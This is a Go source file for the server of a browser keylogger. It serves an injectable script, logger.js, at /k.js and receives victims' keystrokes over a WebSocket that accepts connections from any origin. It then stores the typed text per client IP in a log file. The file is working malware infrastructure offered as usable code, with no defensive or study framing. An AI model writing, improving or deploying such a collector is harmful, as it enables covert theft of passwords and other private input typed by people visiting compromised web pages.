package main

import (
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

var (
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}

	listenAddr string
	wsAddr     string
	loggedKeys map[string]string
	logFile    string

	jsTemplate *template.Template
)

func init() {
	flag.StringVar(&listenAddr, "listen-addr", "", "Address to listen on")
	flag.StringVar(&wsAddr, "ws-addr", "", "Address for WebSocket connection")
	flag.Parse()

	var err error
	jsTemplate, err = template.ParseFiles("logger.js")
	if err != nil {
		panic(err)
	}

	loggedKeys = make(map[string]string)

	// Does not perform any checks to see if the file already exists, so will truncate it if it does
	logFile = "log.txt"
	f, err := os.Create(logFile)
	if err != nil {
		panic(err)
	}
	f.Close()
}

func serveWS(w http.ResponseWriter, r *http.Request) {
	var currentKey string

	// Open log file for appending data
	f, err := os.OpenFile(logFile, os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		panic(err)
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		http.Error(w, "", 500)
		return
	}
	defer conn.Close()

	connectedIP := conn.RemoteAddr().String()

	fmt.Printf("Connection from %s\n", connectedIP)

	loggedKeys[connectedIP] = ""
	for {
		// If error is received here it means the client disconnected or something went wrong
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}

		fmt.Printf("From %s: %s\n", connectedIP, string(msg))
		currentKey = string(msg)

		// Append current key to loggedKeys map key associated with the current client IP
		loggedKeys[connectedIP] += currentKey
	}

	// When client disconnect or some other issue, write logged keys from this client to the log file
	fmt.Printf("Connection from %s closed, writing to log file.\n", connectedIP)
	_, err2 := f.WriteString(connectedIP + ":" + loggedKeys[connectedIP] + "\n")
	if err2 != nil {
		panic(err2)
	}

	f.Close()

}

func serveFile(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	jsTemplate.Execute(w, wsAddr)
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/ws", serveWS)
	r.HandleFunc("/k.js", serveFile)
	log.Fatal(http.ListenAndServe(":8080", r))
}
